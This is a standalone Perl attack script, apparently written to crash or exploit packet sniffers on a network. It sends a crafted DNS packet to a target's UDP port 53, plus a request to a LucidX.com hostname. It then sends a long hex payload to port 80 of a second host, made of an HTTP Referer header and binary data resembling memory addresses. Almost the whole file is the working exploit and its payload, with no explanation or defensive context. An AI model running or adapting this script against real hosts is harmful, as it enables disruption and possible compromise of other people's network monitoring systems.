#!/usr/bin/perl

use IO::Socket;

unless (@ARGV == 2) {
 die "usage: $0 <host to kill sniffs> <host with open port 80 [that host can sniff]>\n";
}

$tcpd1 = "eea600000001000000000000c00c00010001";
$urls1 =~ s/\s//g;
$urls2 = "GET / HTTP/1.0\nHost: do.not.enter.LucidX.com\n\n";

$sock = IO::Socket::INET->new(
	PeerAddr => "do.not.enter.LucidX.com",
	PeerPort => 80,
	Proto    => "tcp",
) or print STDERR "Can't open socket: $!\n";
print $sock $urls2;
close($sock);

$sock = IO::Socket::INET->new(
	PeerAddr => $ARGV[0],
	PeerPort => 53,
	Proto    => "udp",
) or print STDERR "Can't open socket: $!\n";
print $sock pack("H*", $tcpd1);
close($sock);

$sock = IO::Socket::INET->new(
	PeerAddr => $ARGV[1],
	PeerPort => 80,
	Proto    => "tcp",
) or print STDERR "Can't open socket: $!\n";
print $sock pack("H*", $urls1);
close($sock);

BEGIN {
 $urls1 = "
  52 65 66 65 72 65 72 3a 20 68 74 74 70 3a 2f 2f
  64 6f 6e 6f 74 67 6f 74 6f 2e 4c 75 63 69 64 58
  2e 63 6f 6d 0d 0a 0d 0a 00 00 00 00 8b 00 00 00
  00 00 00 00 53 05 00 00 ba 03 00 00 0e 05 00 00
  e5 04 00 00 19 01 00 00 24 03 00 00 00 00 00 00
  ce 04 00 00 d0 05 00 00 b8 04 00 00 65 04 00 00
  32 04 00 00 ca 05 00 00 0d 01 00 00 3b 06 00 00
  01 01 00 00 3a 06 00 00 a0 01 00 00 89 04 00 00
  00 00 00 00 8a 01 00 00 db 01 00 00 00 00 00 00
  d8 01 00 00 3d 03 00 00 4f 04 00 00 66 05 00 00
  00 00 00 00 2a 00 00 00 26 06 00 00 1d 05 00 00
  6b 02 00 00 d3 04 00 00 6b 05 00 00 fe 05 00 00
  93 05 00 00 d6 01 00 00 c7 02 00 00 5d 03 00 00
  95 04 00 00 00 00 00 00 50 00 00 00 56 03 00 00
  00 00 00 00 1e 01 00 00 fa 03 00 00 cc 01 00 00
  b7 00 00 00 d2 05 00 00 3c 03 00 00 00 00 00 00
  bf 04 00 00 00 00 00 00 00 00 00 00 8b 05 00 00
  c3 03 00 00 00 00 00 00 01 05 00 00 a6 05 00 00
  ae 05 00 00 00 00 00 00 9f 03 00 00 84 04 00 00
  0b 04 00 00 5a 02 00 00 d0 04 00 00 96 05 00 00
  1b 05 00 00 f0 02 00 00 11 06 00 00 72 00 00 00
  7a 01 00 00 22 02 00 00 00 00 00 00 c1 03 00 00
  fe 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  58 00 00 00 7f 00 00 00 00 00 00 00 cd 03 00 00
  c0 02 00 00 8e 03 00 00 08 05 00 00 26 00 00 00
  00 00 00 00 8f 04 00 00 00 00 00 00 a8 05 00 00
  42 05 00 00 3f 04 00 00 7f 03 00 00 a4 03 00 00
  12 04 00 00 d3 00 00 00 a3 03 00 00 45 06 00 00
  44 02 00 00 09 06 00 00 52 04 00 00 1b 06 00 00
  00 05 00 00 56 04 00 00 00 00 00 00 f2 02 00 00
  16 05 00 00 00 00 00 00 e9 05 00 00 7d 05 00 00
  33 05 00 00 c5 00 00 00 77 04 00 00 0b 02 00 00
  fc 04 00 00 e1 02 00 00 c3 04 00 00 06 06 00 00
  a1 03 00 00 e0 02 00 00 36 01 00 00 00 00 00 00
  72 01 00 00 b3 d8 04 28 ce fa 06 28 ce fa 06 28
  f3 03 00 00 62 d8 04 28 c8 b2 05 28 20 00 06 28
  00 00 00 00 00 00 00 00 e3 04 00 00 20 00 06 00
  7c fa bf bf 0f d8 04 28 ce fa 06 28 47 b7 a1 0a
  00 e1 05 28 00 00 00 00 c8 b2 05 28 e0 4b 0e 28
  ce fa 06 28 00 00 00 00 67 05 00 00 f8 00 00 00
  da 02 00 00 00 00 00 00 00 e1 05 28 00 00 00 00
  ec fa bf bf 4b d6 04 28 ce fa 06 28 47 b7 a1 0a
  e8 a1 05 28 dc fa bf bf b3 d8 04 28 1c 84 04 08
  93 d1 06 28 7e e8 04 28 62 d8 04 28 c8 b2 05 28
  20 00 06 28 00 00 00 00 c8 b2 05 28 80 b7 05 28
  20 00 06 01 00 fb bf bf 0f d8 04 28 1c 84 04 08
  04 cf 8a 06 00 e1 05 28 01 00 00 00 c8 b2 05 28
  00 e0 05 28 1c 84 04 08 02 00 00 00 02 00 00 00
  1c fb bf bf 65 c9 04 28 08 00 00 00 00 e1 05 28
  03 00 00 01 70 fb bf bf 4b d6 04 28 1c 84 04 08
  04 cf 8a 06 e8 a1 05 28 60 fb bf bf 01 00 00 00
  64 fb bf bf 6b c4 04 28 f0 a1 05 28 00 e0 05 28
  00 e1 05 28 ea c3 04 28 8e d5 04 28 c8 b2 05 28
  00 e0 05 28 1c 84 04 08 04 00 00 00 80 b7 05 28
  7c fb bf bf 01 69 07 28 00 e1 05 28 ec b3 06 28
  f8 fb bf 01 00 e1 05 28 28 fb bf bf 02 00 00 00
  02 00 00 00 d0 fb bf bf 36 c0 04 28 1c 84 04 08
  04 cf 8a 06 00 e0 05 28 cc fb bf bf 01 00 00 00
  00 e0 05 28 d0 fb bf bf 16 c0 04 28 1c 84 04 08
  00 00 00 00 a4 df 04 28 ea bf 04 28 c8 b2 05 28
  00 e0 05 28 78 9b 04 08 bd de 04 28 c8 b2 05 28
  00 e0 05 28 aa b8 04 28 30 83 04 08 c8 b2 05 01
  00 e1 05 28 00 fc bf bf 6e b9 04 28 00 20 06 28
  00 e0 05 28 fc fb bf bf 01 00 00 00 02 00 00 00 ";
}